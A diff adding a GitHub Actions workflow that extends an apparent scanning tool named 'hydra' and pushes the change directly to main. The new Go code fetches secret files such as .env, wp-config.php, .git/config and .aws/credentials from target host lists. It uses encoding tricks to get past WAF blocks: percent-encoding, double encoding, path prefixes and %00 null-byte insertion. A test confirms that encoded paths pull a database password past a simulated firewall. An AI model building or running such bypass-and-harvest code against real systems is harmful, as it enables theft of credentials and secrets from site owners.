@@ -1,0 +1,229 @@
+name: apply-variants-2
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: main
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - name: ecriture du mode etendu
+        run: |
+          cat > internal/fuzz/variants_ext.go <<'GOEOF'
+          package fuzz
+
+          import "strings"
+
+          var highValue = []string{
+          	"/.env", "/.env.local", "/.env.prod", "/.env.production", "/.env.bak",
+          	"/wp-config.php", "/wp-config.php.bak", "/.git/config", "/.git/HEAD",
+          	"/config.php.bak", "/docker-compose.yml", "/.aws/credentials",
+          	"/.htpasswd", "/.svn/entries", "/backup.sql", "/app.js.map", "/main.js.map",
+          }
+
+          func IsHighValue(p string) bool {
+          	for _, s := range highValue {
+          		if strings.HasSuffix(p, s) {
+          			return true
+          		}
+          	}
+          	return false
+          }
+
+          func pct(s, hex string) string {
+          	var b strings.Builder
+          	for i := 0; i < len(s); i++ {
+          		c := s[i]
+          		if c == '/' || c == '.' {
+          			b.WriteByte('%')
+          			b.WriteByte(hex[c>>4])
+          			b.WriteByte(hex[c&0x0f])
+          			continue
+          		}
+          		b.WriteByte(c)
+          	}
+          	return b.String()
+          }
+
+          func VariantsExtended(raw string) []string {
+          	if !strings.HasPrefix(raw, "/") {
+          		raw = "/" + raw
+          	}
+          	out := []string{raw}
+          	if !IsHighValue(raw) {
+          		return out
+          	}
+          	seen := map[string]bool{raw: true}
+          	add := func(p string) {
+          		if seen[p] {
+          			return
+          		}
+          		seen[p] = true
+          		out = append(out, p)
+          	}
+          	low := pct(raw, "0123456789abcdef")
+          	add(low)
+          	add(strings.ReplaceAll(low, "%", "%25"))
+          	add(pct(raw, "0123456789ABCDEF"))
+          	add(raw + "/")
+          	add("/./" + strings.TrimPrefix(raw, "/"))
+          	if i := strings.LastIndex(raw, "."); i > strings.LastIndex(raw, "/") {
+          		add(raw[:i] + "%00" + raw[i:])
+          	}
+          	return out
+          }
+          GOEOF
+      - name: ecriture du test d'integration
+        run: |
+          cat > internal/scan/variants_test.go <<'GOEOF'
+          package scan_test
+
+          import (
+          	"context"
+          	"net/http"
+          	"net/http/httptest"
+          	"strings"
+          	"testing"
+          	"time"
+
+          	"hydra/internal/auth"
+          	"hydra/internal/scan"
+          	"hydra/internal/store"
+          )
+
+          func runBlockedScan(t *testing.T, extended bool) []store.Hit {
+          	t.Helper()
+          	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+          		if strings.Contains(r.RequestURI, "%") {
+          			w.WriteHeader(http.StatusOK)
+          			_, _ = w.Write([]byte("APP_NAME=hydra\nDB_PASSWORD=Qm7Tz4Lp9Rv2Xk8Bw3Nc6Yd\n"))
+          			return
+          		}
+          		w.WriteHeader(http.StatusForbidden)
+          		_, _ = w.Write([]byte("forbidden by waf"))
+          	}))
+          	defer server.Close()
+          	ctx := context.Background()
+          	st, err := store.Open(ctx, t.TempDir())
+          	if err != nil {
+          		t.Fatal(err)
+          	}
+          	defer st.Close()
+          	if err := st.Migrate(ctx); err != nil {
+          		t.Fatal(err)
+          	}
+          	if extended {
+          		if err := st.SetSetting(ctx, "variants_extended", "true"); err != nil {
+          			t.Fatal(err)
+          		}
+          	}
+          	hash, err := auth.HashPassword("variants-passphrase")
+          	if err != nil {
+          		t.Fatal(err)
+          	}
+          	user, err := st.CreateUser(ctx, "variants@example.com", "variants", hash, "admin")
+          	if err != nil {
+          		t.Fatal(err)
+          	}
+          	list, err := st.CreateList(ctx, user.ID, "lab", "L7", []string{strings.TrimPrefix(server.URL, "http://")}, true)
+          	if err != nil {
+          		t.Fatal(err)
+          	}
+          	path, err := st.CreatePath(ctx, user.ID, "/.env", nil, "test")
+          	if err != nil {
+          		t.Fatal(err)
+          	}
+          	crack, err := st.CreateCrack(ctx, user.ID, list.ID, path.ID, true)
+          	if err != nil {
+          		t.Fatal(err)
+          	}
+          	if err := scan.NewScanner(st, 3*time.Second, 2).RunCrack(ctx, crack.ID); err != nil {
+          		t.Fatal(err)
+          	}
+          	hits, err := st.Hits(ctx, user.ID, "", "", "", 10)
+          	if err != nil {
+          		t.Fatal(err)
+          	}
+          	return hits
+          }
+
+          func TestEncodedVariantsReachBlockedPath(t *testing.T) {
+          	hits := runBlockedScan(t, true)
+          	if len(hits) == 0 {
+          		t.Fatal("aucun hit via les variantes")
+          	}
+          	if !strings.Contains(hits[0].Path, "%") {
+          		t.Fatalf("le hit ne vient pas d'une forme encodee: %q", hits[0].Path)
+          	}
+          	if hits[0].Vuln != "env_exposure" {
+          		t.Fatalf("detection basee sur la reference attendue, obtenu %q", hits[0].Vuln)
+          	}
+          }
+
+          func TestLiteralOnlyMissesBlockedPath(t *testing.T) {
+          	if hits := runBlockedScan(t, false); len(hits) != 0 {
+          		t.Fatalf("le mode par defaut ne devrait rien trouver: %+v", hits)
+          	}
+          }
+          GOEOF
+      - name: branchement dans le scanner
+        run: |
+          python3 - <<'PYEOF'
+          import pathlib, sys
+          p = pathlib.Path("internal/scan/scanner.go")
+          s = p.read_text(encoding="utf-8")
+
+          old_join = 'copy := *base\n\tcopy.Path = variant\n\tcopy.RawPath = ""\n\treturn copy.String(), nil'
+          new_join = ('raw, query, _ := strings.Cut(variant, "?")\n'
+                      '\tdecoded, err := url.PathUnescape(raw)\n'
+                      '\tif err != nil {\n\t\treturn "", err\n\t}\n'
+                      '\tcopy := *base\n\tcopy.Path = decoded\n\tcopy.RawPath = raw\n\tcopy.RawQuery = query\n'
+                      '\treturn copy.String(), nil')
+          if old_join not in s:
+              sys.exit("ancre joinTargetPath absente")
+          s = s.replace(old_join, new_join, 1)
+
+          old_mode = 'variants = fuzz.VariantPaths(pathConfig.Raw)\n\t}'
+          new_mode = ('variants = fuzz.VariantPaths(pathConfig.Raw)\n'
+                      '\t\tif s.store.StringSetting(ctx, "variants_extended", "false") == "true" {\n'
+                      '\t\t\tvariants = fuzz.VariantsExtended(pathConfig.Raw)\n\t\t}\n\t}')
+          if old_mode not in s:
+              sys.exit("ancre mode etendu absente")
+          s = s.replace(old_mode, new_mode, 1)
+
+          old_detect = 'extract.Detect(variant, response.Body)'
+          if old_detect not in s:
+              sys.exit("ancre detection absente")
+          s = s.replace(old_detect, 'extract.Detect(pathConfig.Raw, response.Body)', 1)
+
+          p.write_text(s, encoding="utf-8")
+          print("scanner branche")
+          PYEOF
+          gofmt -w internal/fuzz/variants_ext.go internal/scan/variants_test.go internal/scan/scanner.go
+          grep -q 'extract.Detect(pathConfig.Raw' internal/scan/scanner.go
+          grep -q 'VariantsExtended' internal/scan/scanner.go
+          grep -q 'PathUnescape' internal/scan/scanner.go
+          echo "controles ok"
+      - name: frontend
+        run: cd web && npm ci --no-audit --no-fund && npm run build
+      - name: suite complete avant push
+        run: |
+          go vet ./...
+          go build ./...
+          go test ./... -count=1
+      - name: commit et push
+        run: |
+          git config user.name "hydra-bot"
+          git config user.email "hydra-bot@users.noreply.github.com"
+          git add -A
+          git commit -m "variantes de chemin opt-in: detection sur la reference"
+          git push origin HEAD:main
